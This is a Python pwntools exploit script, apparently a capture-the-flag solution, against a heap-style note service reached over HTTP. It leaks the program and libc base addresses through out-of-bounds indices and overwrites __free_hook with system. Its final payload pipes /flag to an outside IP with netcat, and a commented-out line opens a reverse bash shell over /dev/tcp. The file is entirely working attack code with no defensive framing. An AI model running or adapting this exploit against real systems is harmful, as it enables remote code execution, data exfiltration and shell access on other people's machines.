
import json
import requests

from base64 import*
from pwn import*

##202.198.27.90:28086
Url = 'http://127.0.0.1:10000/'
context.terminal = ['tmux','splitw','-h']

elf = ELF('./srv')
libc = ELF('./libc-2.31.so')

def add(idx,payload):
    data = p32(idx) + payload
    res = json.loads(requests.post(url=Url + 'add',data=data).text)
    print(res)

def show(idx):
    data = p32(idx)
    text  = requests.post(url=Url + 'show',data=data).text
    res = json.loads(text)
    print(res)
    return res

def edit(idx,payload):
    data = p32(idx) + payload
    text  = requests.post(url=Url + 'edit',data=data).text
    res = json.loads(text)
    return res

def free(idx):
    data = p32(idx)
    text  = requests.post(url=Url + 'delete',data=data).text
    res = json.loads(text)
    return res

content = show(-31 & 0xffffffff)['content'];
elf_base = u64(b64decode(content).ljust(8,b'\x00')) - 0x5008
log.success('elf_base:' + hex(elf_base))

payload = p64(elf_base + 0x5008) + p64(elf_base + elf.got['puts'])
edit(-31 & 0xffffffff,payload)
##leak libc
content = show(-30 & 0xffffffff)['content']
libc_base = u64(b64decode(content).ljust(8,b'\x00')) - 0x84420
log.success('elf_base:' + hex(libc_base))

#
payload = p64(elf_base + 0x5008) + p64(libc_base + libc.symbols['__free_hook'])
edit(-31 & 0xffffffff,payload)

##__free_hook -> system
payload = p64(libc_base + libc.symbols['system'])
edit(-30 & 0xffffffff,payload)

payload = b'cat /flag | nc 81.68.224.152 7777\x00'
#payload = b'/bin/bash -i 0>/dev/tcp/192.168.237.142/7777 2>&0 1>&0\x00'
add(0,payload)
free(0)
